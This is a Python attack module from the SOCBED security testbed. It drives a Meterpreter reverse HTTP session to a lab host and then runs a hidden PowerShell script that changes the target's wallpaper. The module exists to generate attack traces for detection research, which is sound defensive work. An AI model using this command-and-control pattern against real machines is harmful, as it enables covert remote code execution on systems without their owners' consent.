# Copyright 2016-2022 Fraunhofer FKIE
#
# This file is part of SOCBED.
#
# SOCBED is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# SOCBED is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with SOCBED. If not, see <http://www.gnu.org/licenses/>.


import time

from attacks import AttackOptions, Attack, AttackInfo
from attacks.reverseconnectionhandler import ReverseConnectionHandler


class ChangeWallpaperAttackOptions(AttackOptions):
    lhost = "Reverse HTTP target host or IP address"
    lport = "Reverse HTTP target port"

    def _set_defaults(self):
        self.lhost = "172.18.0.3"
        self.lport = "80"


class ChangeWallpaperAttack(Attack):
    info = AttackInfo(
        name="c2_change_wallpaper",
        description="Changes the wallpaper on the target host")
    options_class = ChangeWallpaperAttackOptions
    change_wallpaper_ps_script = "C:/BREACH/change_wallpaper.ps1"

    def run(self):
        with self.check_printed("Backgrounding session"):
            with self.wrap_ssh_exceptions():
                self._start_handler()
                self._handle_output()

    def _start_handler(self):
        self.handler = ReverseConnectionHandler(self.ssh_client, self.options.lhost, self.options.lport)
        self.handler.start()

    def _handle_output(self):
        for line in self.handler.stdout:
            self._respond(line)
            self.print(line)

    def _respond(self, line):
        if "Meterpreter session 1 opened" in line:
            time.sleep(2)
            self._collect_files()
        elif ("Backgrounding session " in line) or \
                ("Exploit completed, but no session was created" in line):
            self.handler.shutdown()

    def _collect_files(self):
        script = self.change_wallpaper_ps_script
        self.ssh_client.write_lines(self.handler.stdin, [f"execute -H -f powershell -a {script}",
                                                         "background"])
